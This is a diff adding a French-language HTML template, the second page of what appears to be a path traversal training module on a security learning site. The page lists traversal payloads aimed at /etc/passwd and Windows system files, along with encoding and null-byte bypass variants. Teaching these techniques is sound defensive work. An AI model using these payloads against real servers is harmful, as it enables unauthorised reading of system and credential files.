@@ -1,0 +1,119 @@
+{% extends "base.html" %}
+
+{% block title %}Path Traversal - Techniques - TestZone{% endblock %}
+
+{% block extra_css %}
+<style>
+    .content-container {
+        max-width: 800px;
+        margin: 0 auto;
+    }
+
+    .page-header {
+        text-align: center;
+        margin-bottom: 2rem;
+        padding: 1.5rem;
+        background: rgba(255, 255, 255, 0.1);
+        border-radius: 10px;
+    }
+
+    .content-section {
+        background: rgba(255, 255, 255, 0.1);
+        border-radius: 10px;
+        padding: 2rem;
+        margin-bottom: 2rem;
+        line-height: 1.6;
+    }
+
+    .content-section h3 {
+        color: #00ff88;
+        margin-bottom: 1rem;
+        font-size: 1.3rem;
+    }
+
+    .content-section p {
+        margin-bottom: 1rem;
+        color: rgba(255, 255, 255, 0.9);
+    }
+
+    .code-block {
+        background: rgba(0, 0, 0, 0.3);
+        border: 1px solid rgba(255, 255, 255, 0.2);
+        border-radius: 5px;
+        padding: 1rem;
+        margin: 1rem 0;
+        font-family: 'Courier New', monospace;
+        color: #00ff88;
+        overflow-x: auto;
+    }
+
+    .navigation {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        margin-top: 3rem;
+    }
+
+    .page-indicator {
+        color: rgba(255, 255, 255, 0.8);
+        font-size: 0.9rem;
+    }
+</style>
+{% endblock %}
+
+{% block content %}
+<div class="content-container">
+    <div class="page-header">
+        <h1 style="color: #00ff88; margin-bottom: 0.5rem;">
+            <i class="fas fa-folder-open"></i> Module Path Traversal
+        </h1>
+        <h2 style="color: #ffffff;">2. Techniques d'attaque Path Traversal</h2>
+    </div>
+
+    <div class="content-section">
+        <h3><i class="fas fa-route"></i> Techniques de base</h3>
+        <p>
+            Voici les principales techniques utilisées pour les attaques path traversal :
+        </p>
+        <div class="code-block">
+// Traversée simple<br>
+../../../etc/passwd<br>
+..\..\..\..\windows\win.ini<br><br>
+// Traversée absolue<br>
+/etc/passwd<br>
+C:\windows\system32\drivers\etc\hosts<br><br>
+// Double encodage<br>
+..%252f..%252f..%252fetc%252fpasswd<br>
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+        </div>
+    </div>
+
+    <div class="content-section">
+        <h3><i class="fas fa-tools"></i> Techniques de contournement</h3>
+        <p>
+            Pour contourner les protections, plusieurs techniques peuvent être utilisées :
+        </p>
+        <ul style="color: rgba(255, 255, 255, 0.9); margin-left: 2rem;">
+            <li><strong>Null byte injection :</strong> ../../../etc/passwd%00.txt</li>
+            <li><strong>Double slashes :</strong> ..//..//..//etc/passwd</li>
+            <li><strong>Variations de points :</strong> ....//....//etc/passwd</li>
+            <li><strong>Encodage Unicode :</strong> \u002e\u002e\u002f</li>
+        </ul>
+    </div>
+
+    <div class="navigation">
+        <a href="/module/path_traversal/page/1" class="btn btn-secondary">
+            <i class="fas fa-arrow-left"></i> Page précédente
+        </a>
+        
+        <div class="page-indicator">
+            Page 2 sur 3
+        </div>
+        
+        <a href="/module/path_traversal/page/3" class="btn">
+            Page suivante <i class="fas fa-arrow-right"></i>
+        </a>
+    </div>
+</div>
+{% endblock %}
+
